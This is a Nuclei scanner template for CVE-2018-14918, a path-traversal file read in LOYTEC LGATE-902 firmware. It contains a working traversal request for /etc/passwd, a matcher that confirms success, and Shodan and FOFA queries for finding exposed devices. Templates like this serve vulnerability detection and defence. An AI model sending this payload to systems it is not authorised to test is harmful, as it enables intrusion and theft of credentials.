id: CVE-2018-14918

info:
  name: LOYTEC LGATE-902 6.3.2 - Local File Inclusion
  author: 0x_Akoko
  severity: high
  description: |
    LOYTEC LGATE-902 6.3.2 is susceptible to local file inclusion which could allow an attacker to manipulate path references and access files and directories (including critical system files) that are stored outside the root folder of the web application running on the device. This can be used to read and configuration files containing, e.g., usernames and passwords.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to read sensitive files on the device, potentially leading to unauthorized access or information disclosure.
  remediation: |
    Apply the latest firmware update provided by LOYTEC to fix the LFI vulnerability.
  reference:
    - https://seclists.org/fulldisclosure/2019/Apr/12
    - http://packetstormsecurity.com/files/152453/Loytec-LGATE-902-XSS-Traversal-File-Deletion.html
    - https://nvd.nist.gov/vuln/detail/CVE-2018-14918
    - https://github.com/ARPSyndicate/kenzer-templates
    - https://github.com/HimmelAward/Goby_POC
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2018-14918
    cwe-id: CWE-22
    epss-score: 0.73138
    epss-percentile: 0.98746
    cpe: cpe:2.3:o:loytec:lgate-902_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: loytec
    product: lgate-902_firmware
    shodan-query:
      - http.html:"LGATE-902"
      - http.html:"lgate-902"
    fofa-query: body="lgate-902"
  tags: cve,cve2018,loytec,lfi,seclists,packetstorm,lgate,xss,vkev

http:
  - method: GET
    path:
      - "{{BaseURL}}/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
# digest: 490a0046304402203b7497cf9a1fcf83e177ad12c6d6779f7a27cca066446696d4016a0dc711644e02204dbcd4d0397de5b401c7e1a3758991f6fb33ad1850f5143ee8d5d5a4ce5404a5:922c64590222798bb761d5b6d8e72950